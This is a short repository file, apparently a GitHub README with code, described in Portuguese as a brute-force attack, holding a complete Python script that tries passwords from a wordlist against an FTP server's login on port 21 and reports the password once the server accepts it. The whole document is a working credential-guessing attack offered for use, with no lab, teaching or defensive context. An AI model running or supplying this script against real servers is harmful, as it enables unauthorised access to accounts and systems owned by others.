# brute-force-ftp
ataque de força bruta

#!/usr/bin/python3

import socket, sys, re

if len(sys.argv) != 3:
    print("Modo de uso: python3 bruteforce-ftp.py 127.0.0.1 usuario")
    sys.exit(0)

target = sys.argv[1]

usuario = sys.argv[2]

f = open('wordlist.txt')

for palavra in f.readlines():

    palavra = palavra.strip()

    print("Realizando brute force FTP: %s:%s" % (usuario, palavra))

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target, 21))
    s.recv(1024)

    s.send(("USER " + usuario + "\r\n").encode())
    s.recv(1024)

    s.send(("PASS " + palavra + "\r\n").encode())
    resposta = s.recv(1024).decode()

    s.send(("QUIT\r\n").encode())

    if re.search('230', resposta):
        print("[+] Senha encontrada --->", palavra)
        break

    s.close()
